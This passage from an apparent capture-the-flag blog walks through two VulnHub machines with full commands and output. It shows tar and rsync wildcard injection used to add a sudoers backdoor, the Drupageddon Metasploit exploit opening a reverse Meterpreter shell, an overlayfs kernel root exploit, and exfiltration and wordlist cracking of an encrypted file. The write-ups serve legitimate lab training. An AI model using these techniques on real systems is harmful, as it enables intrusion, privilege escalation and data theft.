</span><span class='line'>[root@defensecode public]# cat shell_output.txt
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>
</span><span class='line'>Trick is that because of the '*.c' wildcard, 'rsync' got '-e sh shell.c' option
</span><span class='line'>on command line, and shell.c will be executed upon 'rsync' start.
</span><span class='line'>Content of shell.c is presented below.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# cat shell.c
</span><span class='line'>/usr/bin/id &gt; shell_output.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 5. Conclusion
</span><span class='line'>
</span><span class='line'>Techniques discussed in article can be applied in different forms on various popular 
</span><span class='line'>Unix tools. In real-world attacks, arbitrary shell options/arguments could be hidden 
</span><span class='line'>among regular files, and not so easily spotted by administrator. Moreover, in case of 
</span><span class='line'>cron jobs, shell scripts or web applications that calls shell commands, that's not 
</span><span class='line'>even important. Moreover, there are probably much more popular Unix tools susceptible 
</span><span class='line'>to previously described wildcard attacks.
</span><span class='line'>Thanks to Hrvoje Spoljar and Sec-Consult for a few ideas regarding this document.</span></code></pre></td></tr></table></div></figure>


<p>This entertaining and useful read will probably come in handy next! I looked around some more, and saw a backup folder inside the / directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>backup.sh
</span><span class='line'>backup.tgz
</span><span class='line'>$ cat backup.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>cd /var/www/html
</span><span class='line'>tar cf /backup/backup.tgz *</span></code></pre></td></tr></table></div></figure>


<p>This backup script creates an archive of all files inside /var/www/html. And it&rsquo;s owned by root. After reading that section about tar command execution, this is a big sign of the next steps to take in achieving root. So I needed to find out if this backup shell script is being used by anything. I grepped for a mention of the script in the files present on the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -r "backup.sh" 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p>And an interesting entry popped up:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>etc/crontab:*/1 *    * * *   root    /backup/backup.sh</span></code></pre></td></tr></table></div></figure>


<p>The backup script is run every minute by cron. Now review the tar command execution section before proceeding. To run arbitrary code, we have to create 3 files inside the directory where tar is run, which in this case is /var/www/html.</p>

<p>Now, remember the checkpoint parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>--checkpoint[=NUMBER]
</span><span class='line'>
</span><span class='line'>    display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>--checkpoint-action=ACTION
</span><span class='line'>    execute ACTION on each checkpoint</span></code></pre></td></tr></table></div></figure>


<p>We can use these to inject arbitrary commands. In other words, run the desired command when the checkpoint is reached. To test it out, I created the files as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "" &gt; --checkpoint=1
</span><span class='line'>echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
</span><span class='line'>echo "/usr/bin/whoami &gt; /tmp/readme" &gt; shell.sh
</span><span class='line'>chmod +x shell.sh</span></code></pre></td></tr></table></div></figure>


<p>And now when tar is run, it will pick up the files I created as parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>--checkpoint-action=exec=sh shell.sh
</span><span class='line'>--checkpoint=1
</span><span class='line'>bomb.jpg
</span><span class='line'>bomb.php
</span><span class='line'>content.php
</span><span class='line'>index.php
</span><span class='line'>info.php
</span><span class='line'>main.php
</span><span class='line'>mj.jpg
</span><span class='line'>nav.php
</span><span class='line'>props.php
</span><span class='line'>shell.sh</span></code></pre></td></tr></table></div></figure>


<p>I waited for a bit and then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls /tmp
</span><span class='line'>readme
</span><span class='line'>systemd-private-b21f86620e1c4dbf8ba8443074d9367f-systemd-timesyncd.service-flEglg
</span><span class='line'>vmware-root
</span><span class='line'>$ cat /tmp/readme
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Awesome! It works! And this is a technique I had no idea about! So now I&rsquo;ve changed the commands to give my low-privilege user full permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh
</span><span class='line'>$ cat shell.sh
</span><span class='line'>echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers</span></code></pre></td></tr></table></div></figure>


<p>Again, after some waiting, the root powers are here!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo su
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)
</span><span class='line'>cat /root/credits.txt
</span><span class='line'>        ,----,                                                               
</span><span class='line'>      ,/   .`|                                                               
</span><span class='line'>    ,`   .'  :  ,---,                          ,---,.                        
</span><span class='line'>  ;    ;     /,--.' |                        ,'  .' |                  ,---, 
</span><span class='line'>.'___,/    ,' |  |  :                      ,---.'   |      ,---,     ,---.'| 
</span><span class='line'>|    :     |  :  :  :                      |   |   .'  ,-+-. /  |    |   | : 
</span><span class='line'>;    |.';  ;  :  |  |,--.   ,---.          :   :  |-, ,--.'|'   |    |   | | 
</span><span class='line'>`----'  |  |  |  :  '   |  /     \         :   |  ;/||   |  ,"' |  ,--.__| | 
</span><span class='line'>    '   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
</span><span class='line'>    |   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
</span><span class='line'>    '   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
</span><span class='line'>    ;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
</span><span class='line'>    '---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
</span><span class='line'>              `--''       \   \  /         |   | ,'  '---'        \   \  /   
</span><span class='line'>                           `----'          `----'                  `----'    
</span><span class='line'>                                                                             
</span><span class='line'>
</span><span class='line'>This was milnet for #vulnhub by @teh_warriar
</span><span class='line'>I hope you enjoyed this vm!
</span><span class='line'>
</span><span class='line'>If you liked it drop me a line on twitter or in #vulnhub.
</span><span class='line'>
</span><span class='line'>I hope you found the clue:
</span><span class='line'>/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
</span><span class='line'>I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time...
</span><span class='line'>
</span><span class='line'>This VM was inspired by The Cuckoo's Egg. 
</span><span class='line'>If you have not read it give it a try:
</span><span class='line'>http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</span></code></pre></td></tr></table></div></figure>


<p>Great challenge, dropping some old-school knowledge about getting command injection by exploiting Unix wildcards!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Increased knowledge will help you now. \
</span><span class='line'>\ Have mate's phone bugged.              /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dropping Droopy]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
    <updated>2018-05-04T13:05:08-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>

<p>1.) Grab a copy of the rockyou wordlist.</p>

<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-generator: Drupal 7 (http://drupal.org)
</span><span class='line'>| http-robots.txt: 36 disallowed entries (15 shown)
</span><span class='line'>| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
</span><span class='line'>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
</span><span class='line'>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
</span><span class='line'>|_/LICENSE.txt /MAINTAINERS.txt
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...</span></code></pre></td></tr></table></div></figure>


<p>Looks like this will be a web-based challenge.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/droopy.png" title="droopy" alt="droopy"></p>

<p>There are quite a few entries inside robots.txt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Crawl-delay: 10
</span><span class='line'># Directories
</span><span class='line'>Disallow: /includes/
</span><span class='line'>Disallow: /misc/
</span><span class='line'>Disallow: /modules/
</span><span class='line'>Disallow: /profiles/
</span><span class='line'>Disallow: /scripts/
</span><span class='line'>Disallow: /themes/
</span><span class='line'># Files
</span><span class='line'>Disallow: /CHANGELOG.txt
</span><span class='line'>Disallow: /cron.php
</span><span class='line'>Disallow: /INSTALL.mysql.txt
</span><span class='line'>Disallow: /INSTALL.pgsql.txt
</span><span class='line'>Disallow: /INSTALL.sqlite.txt
</span><span class='line'>Disallow: /install.php
</span><span class='line'>Disallow: /INSTALL.txt
</span><span class='line'>Disallow: /LICENSE.txt
</span><span class='line'>Disallow: /MAINTAINERS.txt
</span><span class='line'>Disallow: /update.php
</span><span class='line'>Disallow: /UPGRADE.txt
</span><span class='line'>Disallow: /xmlrpc.php
</span><span class='line'># Paths (clean URLs)
</span><span class='line'>Disallow: /admin/
</span><span class='line'>Disallow: /comment/reply/
</span><span class='line'>Disallow: /filter/tips/
</span><span class='line'>Disallow: /node/add/
</span><span class='line'>Disallow: /search/
</span><span class='line'>Disallow: /user/register/
</span><span class='line'>Disallow: /user/password/
</span><span class='line'>Disallow: /user/login/
</span><span class='line'>Disallow: /user/logout/
</span><span class='line'># Paths (no clean URLs)
</span><span class='line'>Disallow: /?q=admin/
</span><span class='line'>Disallow: /?q=comment/reply/
</span><span class='line'>Disallow: /?q=filter/tips/
</span><span class='line'>Disallow: /?q=node/add/
</span><span class='line'>Disallow: /?q=search/
</span><span class='line'>Disallow: /?q=user/password/
</span><span class='line'>Disallow: /?q=user/register/
</span><span class='line'>Disallow: /?q=user/login/
</span><span class='line'>Disallow: /?q=user/logout/</span></code></pre></td></tr></table></div></figure>


<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/drupal_drupageddon
</span><span class='line'>msf exploit(drupal_drupageddon) &gt; info
</span><span class='line'>
</span><span class='line'>       Name: Drupal HTTP Parameter Key/Value SQL Injection
</span><span class='line'>     Module: exploit/multi/http/drupal_drupageddon
</span><span class='line'>   Platform: PHP
</span><span class='line'>       Arch: php
</span><span class='line'> Privileged: No
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Excellent
</span><span class='line'>  Disclosed: 2014-10-15
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  SektionEins
</span><span class='line'>  Christian Mehlmauer &lt;FireFart@gmail.com&gt;
</span><span class='line'>  Brandon Perry
</span><span class='line'>
</span><span class='line'>Available targets:
</span><span class='line'>  Id  Name
</span><span class='line'>  --  ----
</span><span class='line'>  0   Drupal 7.0 - 7.31
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name       Current Setting  Required  Description
</span><span class='line'>  ----       ---------------  --------  -----------
</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>  RHOST      192.168.217.139  yes       The target address
</span><span class='line'>  RPORT      80               yes       The target port (TCP)
</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>  TARGETURI  /                yes       The target URI of the Drupal installation
</span><span class='line'>  VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>Payload information:
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module exploits the Drupal HTTP Parameter Key/Value SQL 
</span><span class='line'>  Injection (aka Drupageddon) in order to achieve a remote shell on 
</span><span class='line'>  the vulnerable instance. This module was tested against Drupal 7.0 
</span><span class='line'>  and 7.31 (was fixed in 7.32).
</span><span class='line'>
</span><span class='line'>References:
</span><span class='line'>  https://cvedetails.com/cve/CVE-2014-3704/
</span><span class='line'>  https://www.drupal.org/SA-CORE-2014-005
</span><span class='line'>  http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
</span><span class='line'>msf exploit(drupal_drupageddon) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:4444 
</span><span class='line'>[*] Testing page
</span><span class='line'>[*] Creating new user yCTZcwgtLV:WLhkIYdDtB
</span><span class='line'>[*] Logging in as yCTZcwgtLV:WLhkIYdDtB
</span><span class='line'>[*] Trying to parse enabled modules
</span><span class='line'>[*] Enabling the PHP filter module
</span><span class='line'>[*] Setting permissions for PHP filter module
</span><span class='line'>[*] Getting tokens from create new article page
</span><span class='line'>[*] Calling preview page. Exploit should trigger...
</span><span class='line'>[*] Sending stage (37543 bytes) to 192.168.217.139
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:4444 -&gt; 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400</span></code></pre></td></tr></table></div></figure>


<p>I dropped into a shell and checked the kernel version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process 1385 created.
</span><span class='line'>Channel 0 created.
</span><span class='line'>uname -a
</span><span class='line'>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python linux_privcheck.py 
</span><span class='line'>Kernel version is 3.13
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: Double-free usb-midi SMEP Local Privilege Escalation
</span><span class='line'>CVE: CVE-2016-2384
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/41999/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: overlayfs Privilege Escalation
</span><span class='line'>CVE: CVE-2015-1328
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/37292/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: ptrace/sysret Privilege Escalation
</span><span class='line'>CVE: CVE-2014-4699
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/34134/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
</span><span class='line'>CVE: N/A
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38390/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: b43 Wireless Driver Privilege Escalation
</span><span class='line'>CVE: CVE-2013-2852
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/38559/
</span><span class='line'>###########################################
</span><span class='line'>###########################################
</span><span class='line'>POTENTIALLY VULNERABLE TO
</span><span class='line'>Name: open-time Capability file_ns_capable() Privilege Escalation
</span><span class='line'>CVE: CVE-2013-1959
</span><span class='line'>Source code: https://www.exploit-db.com/exploits/25450/
</span><span class='line'>###########################################</span></code></pre></td></tr></table></div></figure>


<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; upload /root/37292.c /tmp/
</span><span class='line'>[*] uploading  : /root/37292.c -&gt; /tmp/
</span><span class='line'>[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c</span></code></pre></td></tr></table></div></figure>


<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc 37292.c -o overlayfs
</span><span class='line'>chmod +x overlayfs
</span><span class='line'>./overlayfs
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library
</span><span class='line'>sh: 0: can't access tty; job control turned off
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat www-data
</span><span class='line'>From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
</span><span class='line'>Date: 14 Apr 2016 04:34:39 +0100
</span><span class='line'>From: Dave &lt;dave@droopy.example.com&gt;
</span><span class='line'>Subject: rockyou with a nice hat!
</span><span class='line'>Message-ID: &lt;730262568@example.com&gt;
</span><span class='line'>X-IMAP: 0080081351 0000002016
</span><span class='line'>Status: NN
</span><span class='line'>
</span><span class='line'>George,
</span><span class='line'>
</span><span class='line'>   I've updated the encrypted file... You didn't leave any
</span><span class='line'>hints for me. The password isn't longer than 11 characters
</span><span class='line'>and anyway, we know what academy we went to, don't you...?
</span><span class='line'>
</span><span class='line'>I'm sure you'll figure it out it won't rockyou too much!
</span><span class='line'>
</span><span class='line'>If you are still struggling, remember that song by The Jam
</span><span class='line'>
</span><span class='line'>Later,
</span><span class='line'>Dave</span></code></pre></td></tr></table></div></figure>


<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>

<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l /usr/share/wordlists/rockyou.txt 
</span><span class='line'>14344392 /usr/share/wordlists/rockyou.txt</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>I made a new file with only the entries that were 11 characters long:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
</span><span class='line'>wc -l rocked.txt 
</span><span class='line'>865891 rocked.txt</span></code></pre></td></tr></table></div></figure>


<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep academy rocked.txt &gt; rockademy.txt
</span><span class='line'>wc -l rockademy.txt 
</span><span class='line'>16 rockademy.txt</span></code></pre></td></tr></table></div></figure>


<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; download /tmp/dave.tc
</span><span class='line'>[*] Downloading: /tmp/dave.tc -&gt; dave.tc
